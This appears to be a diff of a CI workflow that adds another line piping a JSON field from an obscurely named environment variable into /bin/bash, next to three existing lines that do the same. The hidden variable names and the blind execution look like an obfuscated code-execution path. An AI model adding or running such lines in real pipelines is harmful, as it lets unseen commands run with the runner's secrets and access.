@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$jhz64047" | jq -r .onw266 | /bin/bash
           echo $bqpt0862 | jq -r .w9356 | /bin/bash
           echo $q1 | jq -r .em0 | /bin/bash
+          echo $dfr103 | jq -r .grp1 | /bin/bash
 
       - name: Archive output
         if: always()
